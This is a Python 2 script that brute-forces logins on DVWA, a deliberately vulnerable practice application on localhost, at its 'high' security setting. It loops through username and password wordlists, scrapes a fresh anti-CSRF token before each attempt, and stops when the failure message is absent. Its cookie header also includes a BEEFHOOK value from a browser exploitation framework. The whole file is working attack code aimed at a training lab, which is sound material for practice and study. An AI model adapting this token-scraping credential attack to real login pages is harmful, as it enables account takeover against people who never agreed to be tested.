#!/usr/bin/env python 2.7
import requests
from bs4 import BeautifulSoup as Soup

ufo = open('user.txt','r')
pfo = open('pass.txt','r')
users = ufo.readlines()
passs = pfo.readlines()
ufo.close()
pfo.close()
url = 'http://127.0.0.1/DVWA-1.9/vulnerabilities/brute/'
txtResponse = 'Username and/or password incorrect.'
headers = {
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
	'Cookie': 'security=high; BEEFHOOK=gUwt9CQWJUgJBlH6wCvlRuCcrvSQi1ZDS6l1jBh1z4DbwjUXpXy0gxFg0aqd9BWLiJKJ4OMadq3YPfDs; PHPSESSID=qbi8p0olf6b5aif4e8ef8e2252',
	'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.135 Safari/537.36'
}

for user in users:
	user = user.strip()
	for pas in passs:
		pas = pas.strip()

		req = requests.get(url,headers=headers)
		soup = Soup(req.content,'lxml')
		token = soup.findAll(attrs={'name':'user_token'})[0].get('value')
		url_submit = 'http://127.0.0.1/DVWA-1.9/vulnerabilities/brute/?username='+user+'&password='+pas+'&Login=Login&user_token='+token
		
		res = requests.post(url_submit,headers=headers)

		if txtResponse in res.content:
			print user,'/',pas,' incorrect'
		else:
			print 'user / pass correct is ==>',user,'/',pas
			exit()

